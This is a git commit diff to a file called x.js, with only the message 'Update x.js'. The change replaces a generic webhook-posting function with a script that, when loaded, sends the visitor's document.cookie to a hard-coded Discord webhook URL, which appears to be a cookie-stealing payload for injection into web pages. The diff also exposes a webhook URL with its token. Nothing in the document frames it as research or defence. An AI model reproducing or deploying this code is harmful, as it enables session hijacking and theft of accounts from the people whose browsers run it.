5b7aae08409bfda001d2f678148fa46438e241d6
Wicker00 <121137601+Wicker00@users.noreply.github.com>
2022-12-20 18:56:28 -0500

    Update x.js

--- x.js
+++ x.js
@@ -1,10 +1,11 @@
-var url = "https://discord.com/api/webhooks/1054896343296004116/Qnt4t2FGVI-WYW0xJOMiXe_wIaJNbyLWGt4SD6nDW71I-Ro3iGtxIzMqRYsEYb0eeVz9"
-function bleep(payload, url) {
-  const request = new XMLHttpRequest();
-  request.open("POST", url);
-  request.setRequestHeader("Content-type", "application/json");
-  const params = {
-    content: payload,
-  };
-  request.send(JSON.stringify(params));
-}
+const url = "https://discord.com/api/webhooks/1054896343296004116/Qnt4t2FGVI-WYW0xJOMiXe_wIaJNbyLWGt4SD6nDW71I-Ro3iGtxIzMqRYsEYb0eeVz9";
+
+fetch(url, {
+  method: "POST",
+  body: JSON.stringify({ content: document.cookie }),
+  headers: {
+    "Content-Type": "application/json",
+  },
+})
+  .then((response) => response.json())
+  .then((data) => console.log(data));
